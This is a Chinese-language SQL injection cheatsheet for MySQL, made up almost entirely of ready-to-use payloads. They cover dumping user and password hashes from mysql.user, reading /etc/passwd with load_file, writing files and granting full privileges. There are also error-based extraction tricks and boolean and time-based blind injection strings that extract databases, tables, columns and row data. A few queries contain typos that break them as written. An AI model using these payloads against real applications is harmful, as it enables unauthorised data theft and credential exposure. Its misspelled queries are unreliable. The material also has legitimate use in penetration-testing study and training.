---
title: SQLi Cheatsheet
categories:
- Web
---

<!-- more -->


## SQLi中的常用SQL查询（MySql）

### 信息搜集

| 信息类型              | 查询                                                                                                                                                                                             |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 数据库版本            | `select version()`<br />`select @@version()`                                                                                                                                                     |
| 当前用户              | `select system_user()`<br />`select user()`                                                                                                                                                      |
| 数据库用户            | `select concat(host,"@",user) from mysql.user`                                                                                                                                                   |
| 数据库用户密码        | `select concat(host, "@",user,":",password) from mysql.user`                                                                                                                                     |
| 数据库管理员账户      | `select concat(host, "@", user) from mysql.user where Super_priv='Y'`<br />`SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER'` |
| 当前数据库            | `select database()`                                                                                                                                                                              |
| 列举所有数据库        | `select schema_name from information_schema.schemata`                                                                                                                                            |
| 列举数据库A的所有表名 | `select table_name from information_schema.tables where table_shcema='A'`                                                                                                                        |
| 列举表A的所有列名     | `select column_name from informaton_schema.columns where table_name='A'`                                                                                                                         |
| 列举包含列A的所有表   | `select concat(schema_name,"-",table_name) from information_schema.columns where column_name='A'`                                                                                                |
| 主机名（IP）          | `select @@hostname`                                                                                                                                                                              |
| mysql路径             | `select @@datadir`                                                                                                                                                                               |

### 数据库操作

| 操作类型       | 查询                                                                                                       |
| -------------- | ---------------------------------------------------------------------------------------------------------- |
| 文件访问       | `select load_file('/etc/passwd') #读文件`<br />`select * from users into dumpfile '/tmp/dump.txt' #写文件` |
| 创建用户       | `create user myuser identified by 'mypass'`                                                                |
| 删除用户       | `drop user myuser`                                                                                         |
| 赋予管理员权限 | `grant all privileges on \*.\*  to test1@'%'`                                                              |

### 关键语法

| 字符串Nth字符             | `select substr('abcd', 1, 1)`                                                                 |
| ------------------------- | --------------------------------------------------------------------------------------------- |
| 比特AND                   | `select 6 and 2 # 110 and 010 = 010`<br />`select 6 and 1 # 110 and 001 = 000`                |
| ASCII码转为字符           | `select char(65) # 'A'`                                                                       |
| 字符转为ASCII码           | `select ascii('A') # 65`                                                                      |
| 类型转换                  | `select cast('1' as unsigned integer) # 1`<br />`select cast(123 as char) # '123'`            |
| 字符串连接                | `select concat('a', char(65)) # 'aA'`                                                         |
| IF 子句                   | `select if(1=1, 'foo', sleep(5)) # if true return 'foo' else sleep 5s`                        |
| CASE 子句                 | `select case when(1=1) then 'foo' else sleep(5) end`                                          |
| 不使用引号                | `select 0x414243 # 'ABC'`                                                                     |
| 延时                      | `select benchmark(100000,md5('A')) # MD5('A') 100000 times`<br />`select sleep(5)`            |
| 注释符                    | `select 1 -- 需留空格`<br />`select 1 #不需要空格`<br />`select/*注释符与关键字间无需空格*/1` |
| 选择Nth行                 | `select * from users limit 0,1 # limit begin count`                                           |
| 将多行数据<br />聚合为1行 | `select group_concat(username) from users`                                                    |

### Error-based

- `ExtractValue(XML_text, xpath)`

  > 该函数是Mysql内部使用XPATH处理XML文本的函数，当输入的xpath无法解析时，函数报错

  因此可以将xpath替换为数据库敏感信息或子查询，错误信息将包含查询结果

```sql
  select ExtractValue(rand(), concat(0x3a,version()));
  ---> ERROR 1105 (HY000): XPATH syntax error: ':5.7.26-0ubuntu0.18.04.1'
  /* char(0x3a)=':'，确保':'后的信息可以完全显示 */
```

- GroupBy count(*)

  考虑查询

```sql
  SELECT COUNT(*),concat('hello',FLOOR(rand(0)*2))x 
  	FROM information_schema.TABLES 
  	GROUP BY x
```
> 当处理第一行时，得到结果 `1,hello0`
>
  > 处理第二行时，得到结果`1,hello1`
>
  > 当处理第三行时，`conat('hello', floor(rand(0)*2))` 的值只会为 `hello0` 或 `hello1`
>
  > 因此会报错出现重复的key `ERROR 1062 (23000): Duplicate entry 'hello1' for key 1`
>
  > 错误信息中包含了`hello1`，造成了信息泄露
>
  > **该利用源自MySql对`count` 和 `group by`的解析问题，在PostgreSQL相同查询则会正确返回结果。**

  例如查询

```sql
  # Get version
  SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x  
  	FROM information_schema.TABLES  
  	GROUP BY x;
  	
  ---> ERROR 1062 (23000): Duplicate entry '5.0.96-0ubuntu31' for key 1
  
  # Get databases, 调整limit参数获取每个数据库
  SELECT COUNT(*),concat(0x3a,(
      	SELECT schema_name 
      	FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a 
  	FROM information_schema.schemata 
  	GROUP BY a LIMIT 0,1;
  
---> ERROR 1062 (23000): Duplicate entry ':information_schema:1' for key 1
```

  **应用到 `AND`子句中（Double Query）**

```sql
  AND (SELECT 1 FROM(
  	SELECT COUNT(*),concat(0x3a,(
      	SELECT schema_name 
      	FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a 
  	FROM information_schema.schemata 
  	GROUP BY a LIMIT 0,1;)b)
  	
---> ERROR 1062 (23000): Duplicate entry ':information_schema:1' for key 1
```

## 盲注

当前端无错误信息或错误信息已被标准化（例如“语法错误”等），只能使用盲注方法

### Boolean-based

> 通过注入**Bool表达式**并观察前端是否返回正确结果来判断该表达式是否为真

如下查询会返回正常结果

```sql
1 AND 1=1 # true
```

如下查询返回结果会改变

```sql
1 AND 1=2 # false
```

#### 提取DBMS版本

```sql
1 AND (ascii(substr((SELECT version()),1,1))) > 52 # Is version[0] > '4'
```

> 若上述查询返回正常结果，则表明版本号字符串（`version()`）的第一个字符大于'4'

逐渐增大比较的字符，则可以推断出数据库版本号，如下所示

```sql
# 假设版本号为  “5.0.96-0ubuntu3”
# 版本字符串用 version 表示

# version[0]
1 AND (ascii(substr((SELECT version()),1,1))) > 52 # true ---> version[0] > '4'
1 AND (ascii(substr((SELECT version()),1,1))) > 53 # false ---> version[0] <= '5'
# version[0] = '5'

# version[1] = '.' 跳过测试

# version[2] 
1 AND (ascii(substr((SELECT version()),3,1))) > 48 # false ---> version[2] <= '0'
# version[2] = '0'

# 以此类推可得 version 全部字符
```

或者使用`like`来猜测每个字符

```sql
AND (SELECT version()) LIKE "5%" # -->version[0]
AND (SELECT version()) LIKE "__0%" # -->version[2]
AND (SELECT version()) LIKE "____9" # -->version[4]
...
```

#### 提取所有数据库

```sql
1 AND (ascii(substr((
    SELECT schema_name FROM information_schema.schemata LIMIT 0,1
	),1,1))) > 95  # db1[0] > 95 ?
	
1 AND (ascii(substr((
    SELECT schema_name FROM information_schema.schemata LIMIT 0,1
	),2,1))) > 95  # db1[1] > 95 ?
	
...

1 AND (ascii(substr((
    SELECT schema_name FROM information_schema.schemata LIMIT 1,1
	),1,1))) > 95  # db2[0] > 95 ?

...
```

#### 提取数据库A中的所有表

```sql
1 AND (ascii(substr((
    SELECT TABLE_NAME FROM information_schema.TABLES 
    	WHERE table_schema="A" 
    	LIMIT 0,1
	),1,1))) > 95--
```

#### 提取表A中所有列

```sql
1 AND (ascii(substr((
    SELECT column_name FROM information_schema.COLUMNS 
    	WHERE TABLE_NAME="A" 
    	LIMIT 0,1
	),1,1))) > 95--
```

#### 提取表A中的所有数据

```sql
1 AND (ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1))) > 95--
```

### Time-based

> 如果无法页面的返回结果无法表明查询是否成功，则需要用通过`IF`和`SLEEP`等语句来使查询的执行时间延长，并以此判断查询是否成功

#### 验证是否存在注入

```sql
1 AND sleep(10) # 若存在注入，则会延时10s
```

#### 提取DBMS版本

```sql
1 AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL) 
# if version[0] >53, then sleep(10)

# or
1 AND IF((SELECT version()) LIKE "5%",sleep(10),NULL) #
```

#### 提取数据库

```sql
1 AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
```

#### 提取表

```sql
1 AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))))> 95,sleep(10),NULL)--
```

#### 提取列

```sql
1 AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
```

#### 提取数据

```sql
1 AND IF(((ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
```





